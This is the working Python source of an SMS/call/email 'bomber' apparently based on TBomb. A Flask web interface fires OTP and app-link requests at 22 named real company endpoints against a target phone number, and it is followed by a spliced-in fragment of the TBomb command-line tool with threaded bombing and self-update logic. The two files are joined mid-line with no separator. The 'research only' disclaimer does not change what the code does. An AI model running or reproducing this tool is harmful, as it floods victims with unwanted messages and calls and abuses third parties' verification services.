import os
import time
import requests
import threading
import random
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# List of User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

# Dictionary of all 22 APIs you provided
SMS_APIS = [
    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
    {"url": "https://www.frotels.com/appsendsms.php", "method": "POST", "data": {"mobno": "{target}"}},
    {"url": "https://www.gapoon.com/userSignup", "method": "POST", "data": {"mobile": "{target}"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "data": {"mobile_number": "{target}"}},
    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}", "method": "GET"},
    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "data": {"phone_number": "{target}"}},
    {"url": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={target}", "method": "GET"},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
    {"url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "data": {"contactNo": "{target}"}},
    {"url": "https://grofers.com/v2/accounts/", "method": "POST", "data": {"user_phone": "{target}"}},
    {"url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"mobileNum": "{target}"}},
    {"url": "https://www.cashify.in/api/cu01/v1/app-link?mn={target}", "method": "GET"},
    {"url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "data": {"phoneNumber": "{target}"}},
    {"url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "data": {"jfsdfu14hkgertd": "{target}"}}
]

# Store active tasks status
status_db = {"success": 0, "failed": 0, "running": False}

def bomb_worker(target, count, delay):
    global status_db
    status_db["success"] = 0
    status_db["failed"] = 0
    status_db["running"] = True
    
    for i in range(count):
        if not status_db["running"]: break
        
        api = random.choice(SMS_APIS)
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        
        try:
            url = api["url"].format(target=target)
            if api["method"] == "GET":
                response = requests.get(url, headers=headers, timeout=10)
            else:
                payload = {k: v.format(target=target) for k, v in api["data"].items()}
                response = requests.post(url, data=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                status_db["success"] += 1
            else:
                status_db["failed"] += 1
        except:
            status_db["failed"] += 1
        
        time.sleep(delay)
    
    status_db["running"] = False

# Web Interface (HTML)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>TBomb Web</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
        input, button { padding: 10px; margin: 5px; width: 80%; max-width: 300px; border-radius: 5px; border: none; }
        button { background: #28a745; color: white; cursor: pointer; font-weight: bold; }
        .status { margin-top: 20px; padding: 15px; border: 1px solid #444; display: inline-block; }
    </style>
</head>
<body>
    <h1>TBomb Online</h1>
    <input type="text" id="phone" placeholder="Enter Mobile (without +91)">
    <input type="number" id="count" placeholder="Number of SMS (Max 100)">
    <input type="number" id="delay" placeholder="Delay in seconds (e.g. 1)" step="0.1">
    <br>
    <button onclick="startBombing()">Start Bombing</button>
    <button style="background:red;" onclick="stopBombing()">Stop</button>

    <div class="status">
        <p>Status: <span id="run_status">Idle</span></p>
        <p>Successful: <span id="sc">0</span></p>
        <p>Failed: <span id="fl">0</span></p>
    </div>

    <script>
        function startBombing() {
            const phone = document.getElementById('phone').value;
            const count = document.getElementById('count').value;
            const delay = document.getElementById('delay').value;
            fetch(`/start?target=${phone}&count=${count}&delay=${delay}`);
        }
        function stopBombing() { fetch('/stop'); }
        
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(data => {
                document.getElementById('sc').innerText = data.success;
                document.getElementById('fl').innerText = data.failed;
                document.getElementById('run_status').innerText = data.running ? "Running..." : "Stopped";
            });
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start')
def start():
    target = request.args.get('target')
    count = int(request.args.get('count', 10))
    delay = float(request.args.get('delay', 1))
    if not status_db["running"]:
        threading.Thread(target=bomb_worker, args=(target, count, delay)).start()
        return jsonify({"msg": "Started"})
    return jsonify({"msg": "Already running"})

@app.route('/status')
def status():
    return jsonify(status_db)

@app.route('/stop')
def stop():
    status_db["running"] = False
    return jsonify({"msg": "Stopped"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))def check_for_updates():
    if DEBUG_MODE:
        mesgdcrt.WarningMessage(
            "DEBUG MODE Enabled! Auto-Update check is disabled.")
        return
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get(
        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version"
    ).text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Starting TBomb")


def notifyen():
    try:
        if DEBUG_MODE:
            url = "https://github.com/TheSpeedX/TBomb/raw/dev/.notify"
        else:
            url = "https://github.com/TheSpeedX/TBomb/raw/master/.notify"
        noti = requests.get(url).text.upper()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
            print()
    except Exception:
        pass


def get_phone_info():
    while True:
        target = ""
        cc = input(mesgdcrt.CommandMessage(
            "Enter your country code (Without +): "))
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            mesgdcrt.WarningMessage(
                "The country code ({cc}) that you have entered"
                " is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage(
            "Enter the target number: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage(
                "The phone number ({target})".format(target=target) +
                "that you have entered is invalid")
            continue
        return (cc, target)


def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
        if not re.search(mail_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "The mail ({target})".format(target=target) +
                " that you have entered is invalid")
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    mesgdcrt.WarningMessage(
        "This tool was made for fun and research purposes only")
    mesgdcrt.SuccessMessage("TBomb was created by SpeedX")


def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                            " seconds")
    mesgdcrt.WarningMessage(
        "This tool was made for fun and research purposes only")
    print()
    input(mesgdcrt.CommandMessage(
        "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()


def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()
        check_for_updates()
        notifyen()

        max_limit = {"sms": 500, "call": 15, "mail": 200}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = ("Enter number of {type}".format(type=mode.upper()) +
                           " to send (Max {limit}): ".format(limit=limit))
                count = int(input(mesgdcrt.CommandMessage(message)).strip())
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(
                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
                    .strip())
                # delay = 0
                max_thread_limit = (count//10) if (count//10) > 0 else 1
                max_threads = int(input(
                    mesgdcrt.CommandMessage(
                        "Enter Number of Thread (Recommended: {max_limit}): "
                        .format(max_limit=max_thread_limit)))
                    .strip())
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()


mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    update()


__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

ASCII_MODE = False
DEBUG_MODE = False

description = """TBomb - Your Friendly Spammer Application

TBomb can be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

TBomb is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start TBomb with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start TBomb with CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start TBomb with MAIL Bomb mode")
parser.add_argument("-ascii", "--ascii", action="store_true",
                    help="show only characters of standard ASCII set")
parser.add_argument("-u", "--update", action="store_true",
                    help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current TBomb contributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current TBomb version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.ascii:
        ASCII_MODE = True
        mesgdcrt = MessageDecorator("stat")
    if args.version:
        print("Version: ", __VERSION__)
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {
            "1": "SMS",
            "2": "CALL",
            "3": "MAIL"
        }
        try:
            while (choice not in avail_choice):
                clr()
                bann_text()
                print("Available Options:\n")
                for key, value in avail_choice.items():
                    print("[ {key} ] {value} BOMB".format(key=key,
                                                          value=value))
                print()
                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
